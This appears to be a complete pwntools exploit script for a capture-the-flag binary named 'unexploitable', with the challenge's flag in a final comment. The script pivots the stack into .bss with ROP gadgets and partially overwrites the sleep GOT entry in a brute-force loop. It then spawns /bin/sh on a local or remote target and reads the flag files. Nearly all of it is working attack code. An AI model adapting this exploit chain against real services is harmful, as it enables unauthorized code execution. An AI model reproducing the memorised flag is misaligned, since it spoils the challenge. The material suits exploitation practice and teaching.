#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.6", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./unexploitable_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
# b *0x400576
b *0x400577
c
'''

while True:
    p = start()

    # ==================== EXPLOIT ====================

    def exploit():

        offset = 0x10
        read_gadget = 0x40055B
        bss = 0x601800
        mov_edi = 0x400600      # mov edi,  [rsp+0x30] ; add rsp, 0x38 ; ret ;
        leave_ret = 0x400576
        ret = leave_ret + 1

        payload = flat({
            offset: [
                exe.got.sleep + 0x10 + 0x10,
                read_gadget
            ]
        }, filler=b'A')

        # input("Payload 1")
        sleep(4)
        s(payload)

        # Start at 0x601020
        payload = flat(

            bss - 0x100 + 0x10, 
            read_gadget,

            exe.got.sleep + 0x10,
            read_gadget

        )

        # input("Payload 2")
        sleep(0.5)
        s(payload)

        # input("Payload 3")
        sleep(0.5)
        s(p16(0x9cb0))

        # Start at 0x601700
        payload = flat(

            0, 
            mov_edi,

            bss - 0x100,
            leave_ret,

            b'C'*0x20,
            p64(bss - 0x100 + 0x50),
            exe.plt.sleep,
            b'/bin/sh\0',

        )

        # input("Payload 4")
        sleep(0.5)
        s(payload)

        try:
            sleep(0.5)
            sl(b'echo WIN!!')
            ru(b'WIN!!')
            return True
        except:
            close()
            return False

        interactive()

    if __name__ == '__main__':
        if exploit():
            sl(b'cat /home/unexploitable/f*')
            interactive()
            break

# FLAG{4_r34lLy_Un3Xpl01T48l3_S3Rv1C3_Sh0UlD_n0T_H4v3_SYsC4ll_1NS1D3}